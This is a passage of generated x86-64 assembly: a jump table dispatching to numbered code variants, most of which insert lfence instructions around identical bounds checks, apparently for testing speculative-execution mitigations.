	cmpl	$17, %eax
	je	.Lmain_win6_var17
	cmpl	$18, %eax
	je	.Lmain_win6_var18
	cmpl	$19, %eax
	je	.Lmain_win6_var19
	cmpl	$20, %eax
	je	.Lmain_win6_var20
	cmpl	$21, %eax
	je	.Lmain_win6_var21
	cmpl	$22, %eax
	je	.Lmain_win6_var22
	cmpl	$23, %eax
	je	.Lmain_win6_var23
	cmpl	$24, %eax
	je	.Lmain_win6_var24
	cmpl	$25, %eax
	je	.Lmain_win6_var25
	cmpl	$26, %eax
	je	.Lmain_win6_var26
	cmpl	$27, %eax
	je	.Lmain_win6_var27
	cmpl	$28, %eax
	je	.Lmain_win6_var28
	cmpl	$29, %eax
	je	.Lmain_win6_var29
	cmpl	$30, %eax
	je	.Lmain_win6_var30
	cmpl	$31, %eax
	je	.Lmain_win6_var31
	cmpl	$32, %eax
	je	.Lmain_win6_var32
	cmpl	$33, %eax
	je	.Lmain_win6_var33
	cmpl	$34, %eax
	je	.Lmain_win6_var34
	cmpl	$35, %eax
	je	.Lmain_win6_var35
	cmpl	$36, %eax
	je	.Lmain_win6_var36
	cmpl	$37, %eax
	je	.Lmain_win6_var37
	cmpl	$38, %eax
	je	.Lmain_win6_var38
	cmpl	$39, %eax
	je	.Lmain_win6_var39
	cmpl	$40, %eax
	je	.Lmain_win6_var40
	cmpl	$41, %eax
	je	.Lmain_win6_var41
	cmpl	$42, %eax
	je	.Lmain_win6_var42
	cmpl	$43, %eax
	je	.Lmain_win6_var43
	cmpl	$44, %eax
	je	.Lmain_win6_var44
	cmpl	$45, %eax
	je	.Lmain_win6_var45
	cmpl	$46, %eax
	je	.Lmain_win6_var46
	cmpl	$47, %eax
	je	.Lmain_win6_var47
	cmpl	$48, %eax
	je	.Lmain_win6_var48
	cmpl	$49, %eax
	je	.Lmain_win6_var49
	cmpl	$50, %eax
	je	.Lmain_win6_var50
	cmpl	$51, %eax
	je	.Lmain_win6_var51
	cmpl	$52, %eax
	je	.Lmain_win6_var52
	cmpl	$53, %eax
	je	.Lmain_win6_var53
	cmpl	$54, %eax
	je	.Lmain_win6_var54
	cmpl	$55, %eax
	je	.Lmain_win6_var55
	cmpl	$56, %eax
	je	.Lmain_win6_var56
	cmpl	$57, %eax
	je	.Lmain_win6_var57
	cmpl	$58, %eax
	je	.Lmain_win6_var58
	cmpl	$59, %eax
	je	.Lmain_win6_var59
	cmpl	$60, %eax
	je	.Lmain_win6_var60
	cmpl	$61, %eax
	je	.Lmain_win6_var61
	cmpl	$62, %eax
	je	.Lmain_win6_var62
	cmpl	$63, %eax
	je	.Lmain_win6_var63
	cmpl	$64, %eax
	je	.Lmain_win6_var64
	cmpl	$65, %eax
	je	.Lmain_win6_var65
	cmpl	$66, %eax
	je	.Lmain_win6_var66
	cmpl	$67, %eax
	je	.Lmain_win6_var67
	cmpl	$68, %eax
	je	.Lmain_win6_var68
	cmpl	$69, %eax
	je	.Lmain_win6_var69
	cmpl	$70, %eax
	je	.Lmain_win6_var70
	cmpl	$71, %eax
	je	.Lmain_win6_var71
	cmpl	$72, %eax
	je	.Lmain_win6_var72
	cmpl	$73, %eax
	je	.Lmain_win6_var73
	cmpl	$74, %eax
	je	.Lmain_win6_var74
	cmpl	$75, %eax
	je	.Lmain_win6_var75
	cmpl	$76, %eax
	je	.Lmain_win6_var76
	cmpl	$77, %eax
	je	.Lmain_win6_var77
	cmpl	$78, %eax
	je	.Lmain_win6_var78
	cmpl	$79, %eax
	je	.Lmain_win6_var79
	cmpl	$80, %eax
	je	.Lmain_win6_var80
	cmpl	$81, %eax
	je	.Lmain_win6_var81
	cmpl	$82, %eax
	je	.Lmain_win6_var82
	cmpl	$83, %eax
	je	.Lmain_win6_var83
	cmpl	$84, %eax
	je	.Lmain_win6_var84
	cmpl	$85, %eax
	je	.Lmain_win6_var85
	cmpl	$86, %eax
	je	.Lmain_win6_var86
	cmpl	$87, %eax
	je	.Lmain_win6_var87
	cmpl	$88, %eax
	je	.Lmain_win6_var88
	cmpl	$89, %eax
	je	.Lmain_win6_var89
	cmpl	$90, %eax
	je	.Lmain_win6_var90
	cmpl	$91, %eax
	je	.Lmain_win6_var91
	cmpl	$92, %eax
	je	.Lmain_win6_var92
	cmpl	$93, %eax
	je	.Lmain_win6_var93
	cmpl	$94, %eax
	je	.Lmain_win6_var94
	cmpl	$95, %eax
	je	.Lmain_win6_var95
	cmpl	$96, %eax
	je	.Lmain_win6_var96
	cmpl	$97, %eax
	je	.Lmain_win6_var97
	cmpl	$98, %eax
	je	.Lmain_win6_var98
	cmpl	$99, %eax
	je	.Lmain_win6_var99
	jmp	.Lmain_win6_var0
## Variant 0
.Lmain_win6_var0:
	popq	%rax
	cmpl	$131071, -36(%rbp)
	jle	.L31
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 1
.Lmain_win6_var1:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 2
.Lmain_win6_var2:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 3
.Lmain_win6_var3:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 4
.Lmain_win6_var4:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 5
.Lmain_win6_var5:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 6
.Lmain_win6_var6:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 7
.Lmain_win6_var7:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 8
.Lmain_win6_var8:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 9
.Lmain_win6_var9:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 10
.Lmain_win6_var10:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 11
.Lmain_win6_var11:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 12
.Lmain_win6_var12:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 13
.Lmain_win6_var13:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 14
.Lmain_win6_var14:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 15
.Lmain_win6_var15:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 16
.Lmain_win6_var16:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 17
.Lmain_win6_var17:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 18
.Lmain_win6_var18:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 19
.Lmain_win6_var19:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 20
.Lmain_win6_var20:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 21
.Lmain_win6_var21:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 22
.Lmain_win6_var22:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 23
.Lmain_win6_var23:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 24
.Lmain_win6_var24:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 25
.Lmain_win6_var25:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 26
.Lmain_win6_var26:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 27
.Lmain_win6_var27:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 28
.Lmain_win6_var28:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 29
.Lmain_win6_var29:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 30
.Lmain_win6_var30:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 31
.Lmain_win6_var31:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 32
.Lmain_win6_var32:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 33
.Lmain_win6_var33:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 34
.Lmain_win6_var34:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 35
.Lmain_win6_var35:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 36
.Lmain_win6_var36:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 37
.Lmain_win6_var37:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 38
.Lmain_win6_var38:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 39
.Lmain_win6_var39:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 40
.Lmain_win6_var40:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 41
.Lmain_win6_var41:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 42
.Lmain_win6_var42:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 43
.Lmain_win6_var43:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 44
.Lmain_win6_var44:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 45
.Lmain_win6_var45:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 46
.Lmain_win6_var46:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 47
.Lmain_win6_var47:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 48
.Lmain_win6_var48:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 49
.Lmain_win6_var49:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 50
.Lmain_win6_var50:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 51
.Lmain_win6_var51:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 52
.Lmain_win6_var52:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 53
.Lmain_win6_var53:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 54
.Lmain_win6_var54:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 55
.Lmain_win6_var55:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 56
.Lmain_win6_var56:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 57
.Lmain_win6_var57:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 58
.Lmain_win6_var58:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 59
.Lmain_win6_var59:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 60
.Lmain_win6_var60:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 61
.Lmain_win6_var61:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 62
.Lmain_win6_var62:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 63
.Lmain_win6_var63:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 64
.Lmain_win6_var64:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 65
.Lmain_win6_var65:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 66
.Lmain_win6_var66:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 67
.Lmain_win6_var67:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 68
.Lmain_win6_var68:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 69
.Lmain_win6_var69:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 70
.Lmain_win6_var70:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 71
.Lmain_win6_var71:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 72
.Lmain_win6_var72:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 73
.Lmain_win6_var73:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 74
.Lmain_win6_var74:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 75
.Lmain_win6_var75:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
	jle	.L31
	lfence
	cmpl	$1, -52(%rbp)
	jle	.L32
	movq	-64(%rbp), %rax
	addq	$8, %rax
	movq	(%rax), %rax
	leaq	-44(%rbp), %rdx
	jmp	.Lmain_win6_continue
## Variant 76
.Lmain_win6_var76:
	popq	%rax
	lfence
	cmpl	$131071, -36(%rbp)
